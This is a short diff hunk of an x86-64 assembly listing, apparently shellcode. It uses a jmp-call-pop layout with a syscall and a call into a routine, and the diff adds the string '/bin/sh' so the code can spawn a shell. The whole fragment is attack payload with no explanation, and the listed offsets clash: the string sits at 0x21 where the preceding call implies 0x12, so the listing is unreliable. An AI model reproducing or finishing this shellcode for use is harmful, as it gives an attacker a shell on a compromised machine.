@@ -14,3 +14,4 @@ loc_a:
     syscall             ; 0x0000000b   2          0f05
 loc_b:
     call loc_a          ; 0x0000000d   5    e8f0ffffff
+    db '/bin/sh'        ; 0x00000021   7
